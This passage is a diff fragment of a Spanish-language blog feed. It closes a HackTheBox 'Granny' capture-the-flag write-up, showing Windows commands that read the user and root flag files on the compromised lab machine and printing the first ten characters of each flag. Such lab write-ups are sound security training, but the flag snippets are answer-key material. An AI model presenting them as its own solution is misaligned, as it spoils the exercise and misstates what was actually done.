-<span class="nb">set</span> /P <span class="nv">user</span><span class="o">=</span>&lt;<span class="s2">"C:</span><span class="se">\D</span><span class="s2">ocuments and Settings</span><span class="se">\L</span><span class="s2">akis</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
-echo.%user:~0,10%
-700c5dc163
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> /b/s root.txt
-C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
-<span class="nb">set</span> /P <span class="nv">root</span><span class="o">=</span>&lt;<span class="s2">"C:</span><span class="se">\D</span><span class="s2">ocuments and Settings</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\r</span><span class="s2">oot.txt"</span>
-echo.%root:~0,10%
-aa4beed1c0
-</code></pre></div></div>
-
-<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">granny</code> de HackTheBox!</p>
-
-<p style="text-align: center;">
-<img src="/assets/images/granny/04-finish.png" />
-</p>
-
-<p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>
-
-<p><strong>Nos vemos en otro bit.</strong></p>]]></content><author><name>BAST1ANT1C</name></author><category term="HackTheBox" /><category term="Writeup" /><category term="Granny" /><summary type="html"><![CDATA[Vamos a resolver la máquina granny de HackTheBox. ¡Let's hack!]]></summary></entry></feed>
+<p><strong>Nos vemos en otro bit.</strong></p>]]></content><author><name>BAST1ANT1C</name></author><category term="HackTheBox" /><category term="Writeup" /><category term="Active" /><category term="Active Directory" /><summary type="html"><![CDATA[Vamos a resolver la máquina active AD de HackTheBox. ¡Let's hack!]]></summary></entry></feed>
